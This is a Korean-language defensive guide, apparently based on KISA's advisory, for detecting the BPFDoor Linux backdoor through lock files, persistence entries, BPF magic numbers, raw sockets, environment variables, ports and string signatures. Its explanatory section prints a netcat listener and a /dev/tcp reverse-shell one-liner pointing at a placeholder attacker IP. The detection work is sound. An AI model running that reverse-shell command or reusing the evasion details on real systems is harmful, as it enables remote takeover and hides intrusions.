# BPFDoor 악성코드 점검 명령어 가이드

> 본 문서는 한국인터넷진흥원(KISA)에서 배포한 "BPFDoor 악성코드 점검 가이드"를 바탕으로 작성되었습니다.

## 목차
- [개요](#개요)
- [BPFDoor란?](#bpfdoor란)
- [Reverse Shell란?](#Reverse-Shell란)
- [뮤텍스락이란?](#뮤텍스락이란)
- [점검 방법](#점검-방법)
  - [1. 뮤텍스/락 파일 점검](#1-뮤텍스락mutexlock-파일-점검)
  - [2. 자동 실행 파일 점검](#2-자동-실행-파일-점검)
  - [3. BPF 점검](#3-bpfberkeley-packet-filter-점검)
  - [4. RAW 소켓 점검](#4-raw-소켓-점검)
  - [5. 환경변수 점검](#5-환경변수-점검)
  - [6. 네트워크 포트 점검](#6-네트워크-포트-점검)
  - [7. 컨트롤러 점검](#7-컨트롤러-점검)
  - [8. 문자열 기반 점검](#8-문자열-기반-점검)
- [점검 스크립트](#점검-스크립트)
- [주의사항](#주의사항)
- [참고자료](#참고자료)

## 개요

BPFDoor의 기능은 스텔스 기능, 리버스셸 통신 기능이 있는 악성코드이다.

## BPFDoor란?

- **리눅스 백도어**: 포트를 열지 않고 외부 연결을 대기하는 백도어
- **매직패킷 기반**: 특정 매직패킷 수신 시 쉘 연결 활성화
- **BPF 기술 악용**: 네트워크 트래픽 필터링으로 탐지 회피
- **다중 연결 모드**: 리버스쉘, 바인드쉘, 원격 쉘 연결 지원


## Reverse Shell이란?

- **Reverse Shell**은 피해자(감염된 시스템)가 **공격자 시스템으로 셸 세션을 역방향으로 연결**하는 기술입니다.
- 이 방식은 일반적인 **방화벽 우회**에 활용됩니다. 피해자가 외부로 연결을 시도하므로, 인바운드 포트가 차단되어 있어도 우회가 가능합니다.
- 공격자는 연결을 수신하는 서버로 대기하고, 피해자가 이 서버로 접속함으로써 공격자는 원격에서 명령을 실행할 수 있는 셸 환경을 얻게 됩니다.

### 예시 시나리오:
1. 공격자는 `nc -lvnp 4444` 명령어로 리버스 셸 연결을 대기.
2. 피해자는 BPFDoor에 의해 `bash -i >& /dev/tcp/공격자IP/4444 0>&1` 명령을 실행.
3. 공격자는 피해자 시스템의 셸을 얻게 됨.

---

## Mutex Lock이란?

- **Mutex(Mutual Exclusion) Lock**은 멀티스레드 환경에서 **동시에 하나의 스레드만 특정 자원(임계 영역)에 접근**할 수 있도록 제한하는 동기화 도구입니다.
- BPFDoor와 같은 악성코드는 여러 인스턴스가 **동시에 실행되는 것을 방지하거나**, **공유 자원에 대한 동시 접근을 제어**하기 위해 뮤텍스를 사용할 수 있습니다.

### 주요 동작 방식:
1. 스레드가 공유 자원에 접근하기 전 `lock.acquire()` 호출.
2. 다른 스레드는 락이 해제될 때까지 대기.
3. 작업이 끝나면 `lock.release()`로 락 해제.


## 점검 방법

> **주의**: 모든 명령어는 root 권한 또는 sudo로 실행해야 합니다.

---

## 1. 뮤텍스/락(Mutex/Lock) 파일 점검

### 점검 이유
BPFDoor는 **중복 실행 방지 메커니즘**을 위해 뮤텍스(상호배제) 파일을 생성합니다. 
이는 악성코드가 시스템에서 여러 번 실행되는 것을 방지하여 시스템 자원 낭비와 탐지 위험을 줄이기 위한 전략입니다. 
특히 0바이트 크기의 락 파일을 `/var/run/` 디렉토리에 생성하는 것이 특징적인 행동 패턴입니다.

BPFDoor는 중복 실행 방지를 위해 `/var/run/` 디렉토리에 0바이트 크기의 뮤텍스 파일을 생성합니다.

### 검색 명령어

```bash
# 0바이트 크기의 .pid 파일과 .lock 파일을 검색하는 명령어
sudo ls -l /var/run/*.pid | awk '$5 == 0 {print $9}'
sudo ls -l /var/run/*.lock | awk '$5 == 0 {print $9}'

# 권한이 644이고 크기가 0인 파일을 검색하는 명령어
sudo stat -c "%a %s %n" /var/run/*.pid /var/run/*.lock 2>/dev/null | awk '$1=="644" && $2==0 { print $3 }'

# 파일의 생성일 및 상세 정보를 확인하는 명령어
sudo ls -al /var/run/<filename>.pid
```

### 점검 판단 기준
- 파일 크기: **0 바이트**
- 파일 권한: **644 (-rw-r--r--)**
- 위치: `/var/run/*.pid` 또는 `/var/run/*.lock`

---

## 2. 자동 실행 파일 점검

### 점검 이유
BPFDoor는 **지속성(Persistence) 확보**를 위해 시스템 부팅 시 자동으로 실행되도록 설정합니다. 
악성코드는 시스템 재부팅 후에도 지속적으로 활동하기 위해 `/etc/sysconfig/` 디렉토리의 초기화 스크립트를 변조합니다. 
특히 `[ -f "악성코드 경로" ] && "악성코드 경로"` 형태의 조건부 실행 구문을 삽입하여 정상적인 시스템 파일인 것처럼 위장하면서 악성 파일을 실행시킵니다.

시스템 부팅 시 악성코드가 자동으로 실행되도록 설정된 스크립트를 탐지합니다.

### 검색 명령어

```bash
# 기본 검색
sudo grep -Er '\[\s*-f\s+/[^]]+\]\s*&&\s*/' /etc/sysconfig/
/etc/sysconfig/test:[ -f /usr/sbin/smartadm ] && /usr/sbin/smartadm

# 호환성 문제 시 대안
sudo find /etc/sysconfig/ -type f -exec egrep '\[\s*-f\s+/[^]]+\]\s*&&\s*/' {} +
```

### 점검 판단 기준
- 형태: `[ -f "악성코드 경로" ] && "악성코드 경로"`
- 위치: `/etc/sysconfig/*`
- 예시: `[ -f /usr/sbin/smartadm ] && /usr/sbin/smartadm`

---

## 3. BPF(Berkeley Packet Filter) 점검

### 점검 이유
BPFDoor의 **핵심 동작 메커니즘**은 BPF(Berkeley Packet Filter) 기술 악용입니다. 
악성코드는 BPF를 사용하여 네트워크 패킷을 실시간으로 모니터링하고, 특정 매직패킷(Magic Packet)을 탐지합니다. 
이를 통해 **포트리스(Portless) 백도어** 기능을 구현하여 외부에서 포트 스캔으로는 탐지되지 않으면서도 은밀하게 명령을 수신할 수 있습니다. 
BPF 필터에 특정 매직넘버가 설정되어 있는지 확인하여 악성 활동을 탐지할 수 있습니다.

BPFDoor의 핵심 기능인 BPF 필터 사용 여부를 점검합니다.


## BPFdoor의 구성 요소 및 역할

| 개념            | BPFdoor에서의 의미                                 |
|-----------------|----------------------------------------------------|
| **BPF**         | 커널에서 매직 패킷만 필터링해 수신, 포트 열지 않음       |
| **매직 넘버**   | 필터 기준값. 공격자와 악성코드만 아는 고유 식별자        |
| **매직 패킷**   | 트리거 역할. 백도어 활성화 명령이 포함된 특수 패킷       |

---

### 검색 명령어

```bash
# 시스템에 등록된 BPF 필터 확인
sudo ss -0pb

# 매직넘버 검색 (10진수)
sudo ss -0pb | grep -E "21139|29269|960051513|36204|40783"

# 매직넘버 검색 (16진수)
sudo ss -0pb | grep -EB1 "$((0x5293))|$((0x7255))|$((0x39393939))|$((0x8D6C))|$((0x9F4F))"
```

### 매직 시퀀스
- **UDP/ICMP**: `0x7255`, `0x9F4F`
- **TCP**: `0x5293`, `0x39393939`, `0x8D6C`

### 요구사항  
- Linux Kernel 3.2 이상
- iproute2 4.0 이상
- CentOS 6.x 이하에서는 확인 불가

---

## 4. RAW 소켓 점검

### 점검 이유
BPFDoor는 **저수준 네트워크 통신**을 위해 RAW 소켓(SOCK_RAW)과 DGRAM 소켓(SOCK_DGRAM)을 사용합니다. 
RAW 소켓은 IP 헤더를 직접 조작할 수 있어 **패킷 위조 및 은밀한 통신**이 가능합니다. 
악성코드는 이를 통해 일반적인 네트워크 모니터링 도구로는 탐지하기 어려운 저수준 패킷 통신을 수행하며, 
ICMP(프로토콜 1), TCP(프로토콜 6), UDP(프로토콜 17) 패킷을 직접 처리하여 매직패킷을 수신하고 명령을 전달받습니다.

SOCK_RAW, SOCK_DGRAM 소켓을 사용하는 의심 프로세스를 탐지합니다.

### 검색 명령어

```bash
# RAW/DGRAM 소켓 사용 프로세스 확인
$ sudo lsof 2>/dev/null | grep -E "IP type=SOCK_RAW|IP type=SOCK_DGRAM" | awk '{print $2}' | sort -u | xargs -r ps -fp

# ss 명령어 기반 로우소켓 점검
sudo ss -apn | grep -E "1 |6 |17 "

# 프로세스 실행파일 경로 확인
sudo ls -l /proc/PID/exe
```

### 과부하 명령어 (권장하지 않음)

```bash
# inode 기반 패킷 소켓 검색 - 시스템 부하 주의
sudo awk '$4=="0800" && $5=="0" {print $9}' /proc/net/packet | while read inode; do 
  sudo grep -r "ino:\s*$inode" /proc/*/fdinfo/ 2>/dev/null | awk -F/ '{print $3}' | sort -u | xargs -r sudo ps -fp
done
```

### 프로토콜 번호
- **1**: ICMP
- **6**: TCP  
- **17**: UDP

---

## 5. 환경변수 점검

### 점검 이유
BPFDoor는 **증거 은폐 및 탐지 회피**를 위해 셸 연결 시 특정 환경변수를 조작합니다. 
`HOME=/tmp`로 설정하여 홈 디렉토리를 임시 디렉토리로 변경하고, `HISTFILE=/dev/null`과 `MYSQL_HISTFILE=/dev/null`로 설정하여 
**명령어 이력을 남기지 않도록** 합니다. 이는 공격자가 실행한 명령들이 시스템 로그나 히스토리 파일에 기록되지 않게 하여 포렌식 분석을 어렵게 만드는 전형적인 APT 공격 기법입니다.

BPFDoor가 셸 연결 시 설정하는 특정 환경변수를 탐지합니다.

### 검색 명령어

```bash
# 환경변수 점검 스크립트 실행
sudo ./bpfdoor_env.sh

# 의심 프로세스 경로 확인
sudo ls -l /proc/PID/exe
```

### 탐지 대상 환경변수
- `HOME=/tmp`
- `HISTFILE=/dev/null`
- `MYSQL_HISTFILE=/dev/null`

---

## 6. 네트워크 포트 점검

### 점검 이유
BPFDoor는 **C&C 서버와의 통신**을 위해 특정 포트 범위를 사용합니다. 
42391-43390 포트 범위와 8000번 포트는 악성코드가 **리버스 셸 연결**이나 **데이터 유출**을 위해 선호하는 포트들 입니다. 
이러한 포트들은 일반적인 서비스에서 사용하지 않는 **비표준 포트**로, 방화벽 규칙에서 간과되기 쉬워 공격자들이 선호합니다. 
또한 BPFDoor는 매직패킷 수신 후 이 포트들을 통해 지속적인 백도어 연결을 유지합니다.

BPFDoor가 사용하는 특정 포트 범위를 모니터링합니다.

### 검색 명령어

```bash
# 기본 netstat 조회
sudo netstat -tulpn

# 특정 포트 범위 검색 (42391-43390, 8000)
sudo netstat -tulpn 2>/dev/null | awk '{
  match($0, /:([0-9]+)/, a); 
  if ((a[1] >= 42391 && a[1] <= 43390) || $0 ~ /8000[^0-9]|$/) 
    print $0
}'

# TCP 연결 상태별 포트 검색
sudo netstat -tulpn 2>/dev/null | awk '
  $1=="tcp" && ($6=="LISTEN" || $6=="ESTABLISHED") {
    lp=substr($4,index($4,":")+1);
    rp=substr($5,index($5,":")+1);
    if((lp>=42391 && lp<=43390 || lp==8000) || (rp>=42391 && rp<=43390 || rp==8000))
      print
  }'
```

### 모니터링 포트
- **범위**: 42391-43390
- **단일**: 8000

---

## 7. 컨트롤러 점검

### 점검 이유
BPFDoor는 **프로세스 위장(Process Masquerading)** 기법을 사용하여 정상적인 시스템 프로세스인 것처럼 위장합니다. 
악성코드는 `/usr/sbin/abrtd`, `/sbin/udevd`, `cmathreshd` 등 **실제 시스템 데몬과 유사한 이름**을 사용하여 시스템 관리자의 의심을 피하려 합니다. 
하지만 실제 실행파일 경로는 다른 위치에 있기 때문에, 프로세스명과 실행파일 경로를 비교하면 위장된 프로세스를 탐지할 수 있습니다. 
이는 **Living off the Land** 기법의 일종으로 시스템에 원래 존재하는 것처럼 보이게 하는 스텔스 기법입니다.

BPFDoor 컨트롤러가 정상 프로세스로 위장하는 패턴을 탐지합니다.

### 검색 명령어

```bash
# 위장 프로세스명 검색
sudo ps -ef | grep -E '/usr/sbin/abrtd|/sbin/udevd|cmathreshd|/sbin/sgaSolAgent|/usr/sbin/atd|pickup'

# 프로세스명 vs 실행파일 비교
sudo ls -l /proc/PID/exe
```

### 의심 프로세스명
- `/usr/sbin/abrtd`
- `/sbin/udevd`
- `cmathreshd`
- `/sbin/sgaSolAgent`
- `/usr/sbin/atd`
- `pickup`

### 판단 기준
프로세스명과 실제 실행파일 경로가 **불일치**하면 위장 프로세스로 의심

---

## 8. 문자열 기반 점검

### 점검 이유
BPFDoor 바이너리에는 **고유한 문자열 패턴**들이 포함되어 있어 정적 분석을 통한 탐지가 가능합니다. 
`MYSQL_HISTFILE=/dev/null`은 히스토리 파일 조작을 위한 환경변수이고, `:h:d:l:s:b:t:`, `:f:wiunomc`, `:f:x:wiuoc` 등은 **명령행 옵션 파싱**을 위한 getopt 함수의 옵션 문자열입니다. 
`ttcompat`는 터미널 호환성과 관련된 문자열로, 이러한 문자열들의 조합은 BPFDoor의 **시그니처(Signature)**가 됩니다. YARA 룰을 사용할 수 없는 환경에서 1차적인 악성 파일 스크리닝에 활용할 수 있습니다.

YARA 도구가 없는 환경에서 악성 파일을 1차적으로 선별하는 방법입니다.

### 검색 명령어

```bash
# 단일 파일 문자열 검색 (권장)
sudo strings -a -n 5 <의심파일경로> | grep -E 'MYSQL_HISTFILE=/dev/null|:h:d:l:s:b:t:|:f:wiunomc|:f:x:wiuoc|ttcompat'

# 특정 경로 일괄 검색 (권장하지 않음 - 고부하)
sudo find <의심경로> -maxdepth 1 -type f -size +15k -size -4M -exec sh -c '
  strings -a -n5 "$1" | sed "s|^|$1: |" | grep -E "MYSQL_HISTFILE=/dev/null|:h:d:l:s:b:t:|:f:wiunomc|:f:x:wiuoc|ttcompat"
' _ {} \;
```

### 탐지 문자열 패턴
- `MYSQL_HISTFILE=/dev/null`
- `:h:d:l:s:b:t:`
- `:f:wiunomc`
- `:f:x:wiuoc`
- `ttcompat`

---

## 점검 스크립트

BPFDoor 탐지를 위한 자동화 스크립트들입니다.

### BPF 점검 스크립트 (bpfdoor_bpf.sh)

```bash
#!/bin/bash
echo "[*] Detecting processes with active BPF usage..."

# Extract PIDs from ss output
sudo ss -0pb | grep -oP 'pid=\K[0-9]+' | sort -u | while read pid; do
    if [[ -e "/proc/$pid" ]]; then
        exe_path=$(readlink -f /proc/$pid/exe 2>/dev/null)
        proc_name=$(cat /proc/$pid/comm 2>/dev/null)
        echo ""
        echo "Process Name: ${proc_name:-Unknown}, PID: $pid"
        echo "  Executable: ${exe_path:-Not found}"
    fi
done
```

### 환경변수 점검 스크립트 (bpfdoor_env.sh)

```bash
#!/bin/bash
echo "[*] Detecting processes with BPFDoor environment variable manipulation..."
echo "Target: HOME=/tmp, HISTFILE=/dev/null, MYSQL_HISTFILE=/dev/null"

CHECK_ENV=("HOME=/tmp" "HISTFILE=/dev/null" "MYSQL_HISTFILE=/dev/null")

for pid in $(ls /proc/ | grep -E '^[0-9]+$'); do
    if [ -r /proc/$pid/environ ]; then
        env_data=$(tr '\0' '\n' < /proc/$pid/environ)
        match_all=true
        
        for check_item in "${CHECK_ENV[@]}"; do
            if ! echo "$env_data" | grep -q "$check_item"; then
                match_all=false
                break
            fi
        done
        
        if [ "$match_all" = true ]; then
            echo "Warning: Process with all suspicious environment variables detected (PID $pid)"
            echo "  $(ps -p $pid -o user=,pid=,ppid=,cmd=)"
            echo ""
        fi
    fi
done
```

---

## 주의사항

### 실행 전 확인사항
1. **백업**: 중요 데이터 백업 완료
2. **권한**: root 또는 sudo 권한 필요
3. **정책**: 사내 보안 정책 준수 여부 확인
4. **영향도**: 시스템 영향 가능성 사전 검토

### 과부하 명령어 사용 조건
다음 조건을 **모두 만족**할 때만 사용 권장:
1. 뮤텍스/락 파일 존재
2. BPF 점검 결과 없음  
3. RAW 소켓 명령어 결과 없음

### 오탐 가능성
- 정상 프로세스도 일부 패턴과 일치할 수 있음
- 의심 파일 발견 시 반드시 **YARA 룰로 2차 검증** 필요
- 문자열 기반 점검은 **1차 선별용**으로만 사용

### 권장 점검 순서
1. 뮤텍스/락 파일 점검
2. BPF 점검
3. 자동 실행 파일 점검
4. RAW 소켓 점검 (4-1)
5. 환경변수 점검
6. 네트워크 포트 점검
7. 컨트롤러 점검
8. 의심 파일 발견 시: 문자열 점검 → YARA 점검

---

## 참고자료
해당 내용은 KISA '[BPFDoor 악성코드 점검 가이드 배포](https://www.boho.or.kr/kr/bbs/view.do?searchCnd=&bbsId=B0000133&searchWrd=&menuNo=205020&pageIndex=1&categoryCode=&nttId=71754)' 가이드를 참고하여 각, 목록 간 점검 이유를 추가&수정한 내용입니다.

### 관련 링크
- [KISA 보호나라](https://boho.or.kr) - 침해사고 신고
- [한국인터넷진흥원](https://www.kisa.or.kr)
